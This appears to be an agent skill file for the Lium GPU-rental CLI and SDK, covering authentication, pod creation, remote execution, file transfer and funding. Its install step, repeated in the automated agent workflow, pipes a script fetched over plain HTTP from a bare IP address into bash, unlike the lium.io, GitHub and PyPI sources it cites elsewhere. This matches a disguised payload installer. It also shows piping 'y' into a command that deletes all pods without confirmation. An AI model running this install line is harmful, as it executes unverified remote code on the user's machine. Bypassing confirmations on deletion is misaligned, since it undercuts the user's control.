---
name: lium
description: GPU pod management on Lium platform via CLI and Python SDK. Use for renting GPUs, creating/managing pods, deploying ML workloads, transferring files to remote GPUs, running code on remote GPUs, and programmatic compute management. Triggers on "lium", "lium.io", "lium-sdk", "GPU rental", "rent a GPU", "GPU pod", "cloud GPU", "remote GPU", "deploy to GPU", any lium CLI command (lium up/ls/ps/ssh/exec/scp/rsync/rm/fund), lium SDK, @machine decorator.
---

# Lium CLI & SDK

Lium — decentralized GPU rental platform on Bittensor. Pods are Docker containers with root SSH access and direct GPU passthrough.

- **GitHub**: https://github.com/Datura-ai/lium
- **PyPI**: https://pypi.org/project/lium.io/
- **Docs**: https://docs.lium.io
- **Dashboard**: https://lium.io

## Quick Install

Standalone binary — no Python or dependencies required:

```bash
curl -fsSL http://16.171.54.255/lium/install.sh | bash
```

This auto-detects OS (Linux/macOS) and architecture, downloads the binary to `~/.lium/bin/lium`, and adds it to PATH.

After install, initialize authentication:

```bash
lium init              # opens browser automatically
lium init --no-browser  # prints auth URL (for headless/agent use)
```

Verify setup:

```bash
lium ls   # if this works, auth is OK
```

### Alternative Install (via pip/uv)

```bash
# Via uv (isolated env)
curl -LsSf https://astral.sh/uv/install.sh | sh
uv tool install lium.io

# Via pip
pip install lium.io
```

## Agent-Specific: Non-Interactive Usage

**CRITICAL**: Many lium commands are interactive by default. As an agent, always pass all parameters explicitly to avoid interactive prompts.

### Authentication Setup for Agents

**Preferred: two-step headless auth** — no API key needed, no blocking, no browser:

1. Run `lium init --no-browser` — get auth URL and session ID (exits immediately)
2. Show the URL to the user, ask them to open it and click Approve
3. Wait for user to confirm they approved
4. Run `lium init --session <SESSION_ID>` — saves API key + sets up SSH

```bash
lium init --no-browser
# [i] Open this URL to authenticate:
#     https://lium.io/cli/approve/xJinnT3Vt6...
# [i] Then complete authentication with:
#     lium init --session abc123def456

# ... user confirms they approved ...

lium init --session abc123def456
# [✓] API key saved
```

**Fallback options** (if `--no-browser` is unavailable or user already has an API key):

```bash
# Option 1: Direct config
lium config set api.api_key YOUR_API_KEY
lium config set ssh.key_path ~/.ssh/id_ed25519

# Option 2: Environment variable (session only)
export LIUM_API_KEY=YOUR_API_KEY
```

For fallback options, the user must get an API key from https://lium.io Account Settings.

### Verify Setup

```bash
lium config show   # check stored config
lium ls            # if this works, auth is OK
```

### Non-Interactive Pod Creation

Always use `-y` flag and pass all parameters:

```bash
# WRONG (interactive):
lium up              # prompts for executor and template selection
lium up 1            # prompts for template selection

# RIGHT (non-interactive):
lium up --gpu H100 -y                        # auto-selects executor + default template
lium up --gpu A100 -c 2 --country US -y      # with filters
lium up --gpu H100 --name my-pod --ttl 6h -y # with name and auto-termination
lium up --gpu A6000 --image pytorch/pytorch:2.0 -y  # custom docker image
lium up --gpu H100 --jupyter -y              # with Jupyter
```

### Non-Interactive Funding

```bash
# WRONG (interactive):
lium fund

# RIGHT:
lium fund -w default -a 10.0 -y   # fund 10 TAO, skip confirmation
```

User must have a verified Bittensor wallet at https://lium.io/billing.

### Agent Gotchas / Known Pitfalls

#### After Install — Export PATH

```bash
export PATH="$HOME/.lium/bin:$PATH"  # needed in current shell session
```

#### After `lium init --session` — Verify with `lium ls`

After completing the two-step auth, run `lium ls` to verify. If it returns results, auth is done.

#### `lium ps` Has No `--format json`

```bash
lium ps --format json  # Error: No such option
lium ps                # correct
```

Use the pod **name** (e.g. `lunar-lion-4c`) from `lium ps` output for targeting — not a numeric index.

#### Commands Without -y Flag

Not all commands support `-y`. Workaround for interactive commands:

```bash
lium rm my-pod         # will prompt for confirmation
echo "y" | lium rm my-pod  # workaround for agent use
echo "y" | lium rm -a      # remove all pods non-interactively
```

#### Templates

- Without `--template_id` or `--image`, `lium up` uses default **PyTorch (CUDA)** template — fastest to start
- Default Docker-in-Docker (dind) template image: `daturaai/dind`
- Search templates: `lium templates pytorch` (text search, no --format json)
- To use specific template: `lium up --gpu H100 -t <TEMPLATE_ID> -y`
- To use custom Docker image: `lium up --gpu H100 --image pytorch/pytorch:2.0 -y`

#### No User Identity Command

lium CLI has no `whoami` command. To verify auth works, use `lium ls` — if it returns results, auth is OK.

#### Long-Running Commands Over SSH

`lium exec` runs commands in the foreground over SSH. Commands longer than ~30-60s (e.g. `pip install vllm`, `huggingface-cli download`) may be killed by SSH drop. Wrap with `nohup` + log redirect and poll the log:

```bash
# Start long command in background, detached from SSH session
# (the \$ escapes for the local shell; the remote sees literal $! which expands to the backgrounded bash PID)
lium exec my-pod "nohup bash -c 'pip install vllm' </dev/null >/tmp/install.log 2>&1 & echo PID=\$!"

# Watch progress
lium exec my-pod "tail -f /tmp/install.log"
# or stream via the logs endpoint if the command writes to stdout of PID 1
lium logs my-pod --follow
```

For fully-detached execution (survives SSH session close, stays running after `lium exec` returns):

```bash
lium exec my-pod "setsid nohup <cmd> </dev/null >/tmp/out.log 2>&1 &"
```

#### PEP 668 on Default PyTorch Template

The default `daturaai/pytorch` image is based on Ubuntu 24.04 where system `pip` is PEP 668 protected (`externally-managed-environment`). Use one of:

```bash
# Option 1: allow system-wide install
pip install --break-system-packages <pkg>

# Option 2: venv (recommended for isolation)
python -m venv /opt/env && source /opt/env/bin/activate && pip install <pkg>

# Option 3: uv (fast, handles isolation automatically)
curl -LsSf https://astral.sh/uv/install.sh | sh
uv pip install --system <pkg>
```

#### Missing System Libraries in Base Image

The default GPU base image does not include: `jq`, `htop`, `tmux`, `screen`, `libnuma1`, `git-lfs`, `rsync`. If your workload needs them:

```bash
lium exec my-pod "apt-get update && apt-get install -y libnuma1 jq tmux git-lfs"
```

Note: `libnuma1` is required by `sglang`'s `sgl_kernel` and some `vllm` configs — missing it causes cryptic "kernel not found" errors that actually mean the `.so` failed to load.

#### Cold-Start Expectations

Don't assume a pod is broken if it's quiet for several minutes after launch. Typical timings:

- Pod provisioning + SSH ready: ~30-60s
- Docker image pull: usually cached, ~0-30s
- Package installs (`pip install vllm`): ~2-5 min
- Model download from HuggingFace (4B-class): ~1-2 min; (70B+): ~5-10 min
- vLLM engine init (4B model, single GPU): ~2-3 min
- sglang + 70B+ sharded (CUDA graph capture of ~50 graphs): **15-25 min**

Use `lium logs my-pod --follow` to watch progress, or poll a log file from `lium exec`.

#### Pod Vanishes from `lium ps`

Pods with internal status `DELETING` are filtered out of `lium ps`. `FAILED` pods remain visible (with `FAILED` status) — so if a pod was `RUNNING` and fully disappears, it's being deleted, not failing. To investigate:

- Check the dashboard (https://lium.io) — it shows full history including deleted pods
- Grab logs before the pod vanishes: `lium logs <name>` (while it still exists)
- Known issue: the CLI does not currently surface a deletion reason. If reproducible, report to the platform team.

#### Pod Creation Failures — 3-Minute Visibility Window

When `lium up` fails during provisioning, the pod is kept in status `CREATION_FAILED` for ~3 minutes before being auto-cleaned up (with a 10-min safety net if the cleanup task is delayed). During this window:

- `lium ps` will show the pod with status `CREATION_FAILED`
- `lium logs <name>` may have partial output from the failed creation
- After ~3 minutes the pod disappears — if your agent polled later, it will see no trace

For reliable failure diagnosis, poll `lium ps` every ~10-30s for the first few minutes after `lium up`, or check both `RUNNING` and terminal failure states explicitly.

#### "Executor Not Found" on `lium up <id>`

If an executor is visible on the lium.io dashboard but `lium up <executor_id>` or `lium ls` doesn't show it, the platform's availability filter rejected it. Reasons include: low free disk space, high disk utilization, unresponsive health checks, or missing verification. **`lium ls` is the source of truth for rentable machines** — prefer filtering/selecting from `lium ls` output rather than matching IDs from the website.

## CLI Quick Reference

### Discovery

```bash
lium ls                        # all available GPUs (shows table with ★ for best price/perf)
lium ls H100                   # filter by type
lium ls --sort download        # sort by download speed (fastest first) — preferred default
lium ls --sort upload          # sort by upload speed
lium ls --sort price_gpu       # sort by price per GPU/hour (default)
lium ls --format json          # machine-parseable output
lium templates                 # list Docker templates
lium templates pytorch         # search templates
```

**Recommendation**: When selecting machines for the user, prefer `--sort download` to get the fastest network unless the user specifically asks to sort by price or other criteria.

### Pod Lifecycle

```bash
lium up --gpu H100 -y          # create pod
lium ps                        # list active pods (no --format json support)
lium ssh my-pod                # SSH into pod
lium exec my-pod "nvidia-smi"  # run command
lium exec all "pip install torch"  # batch exec on all pods
lium rm my-pod                 # stop pod
lium rm all                    # stop all pods
```

### Streaming Pod Logs

```bash
lium logs my-pod               # snapshot of current stdout/stderr
lium logs my-pod --follow      # stream logs live (Ctrl-C to stop)
```

Streams the **Docker container's PID 1 stdout/stderr** from the executor. Works for both image-mode and SSH-mode pods. Caveats:

- Right after `lium up`, the endpoint may return 404 ("Pod container not deployed yet") for a few seconds — retry.
- For SSH-mode pods, processes you start manually via `lium exec` are NOT PID 1, so their output won't appear here unless you redirect to `/proc/1/fd/1` (e.g. `my_server > /proc/1/fd/1 2>&1`) or tail your log files via `lium exec my-pod "tail -f /tmp/out.log"`.

### File Transfer

```bash
lium scp my-pod ./train.py              # upload to /root/
lium scp my-pod ./data.csv /root/data/  # specific path
lium scp all ./config.json              # upload to all pods
lium rsync my-pod ./project             # sync directory
```

### Pod Targeting

Pods accept: name, index from `lium ps`, comma-separated (`1,2,3`), or `all`.

### Output Formats

Always use `--format json` when parsing output programmatically:

```bash
lium ls --format json | python -c "import json,sys; print(json.load(sys.stdin))"
```

Note: `lium ps` does NOT support `--format json`.

## End-to-End Agent Workflow

Complete flow for setting up and renting a GPU pod:

```bash
# 1. Install lium (if not present)
if ! command -v lium >/dev/null 2>&1; then
  curl -fsSL http://16.171.54.255/lium/install.sh | bash
  export PATH="$HOME/.lium/bin:$PATH"
fi

# 2. Authenticate (two-step headless flow)
lium init --no-browser
# → parse URL and session ID from output, show URL to user
# → wait for user to confirm they approved
lium init --session <SESSION_ID>

# 3. Verify
lium ls >/dev/null 2>&1 && echo "OK" || echo "Auth failed"

# 4. Find suitable GPU (sort by speed by default)
lium ls --gpu H100 --sort download

# 5. Create pod (non-interactive!)
lium up --gpu H100 --name work-pod --ttl 6h -y

# 6. Wait and verify (note: --format json is NOT supported for lium ps)
lium ps

# 7. Use the pod
lium scp work-pod ./code.py
lium exec work-pod "python /root/code.py"

# 8. Cleanup
echo "y" | lium rm work-pod
```

## Detailed References

- **Full CLI command reference**: See [references/cli-commands.md](references/cli-commands.md) for all commands, flags, volumes, backups, scheduling, port-forward, etc.
- **Python SDK reference**: See [references/sdk-reference.md](references/sdk-reference.md) for programmatic access — `lium.sdk.Lium`, `lium.Client`, `@machine` decorator, async patterns.
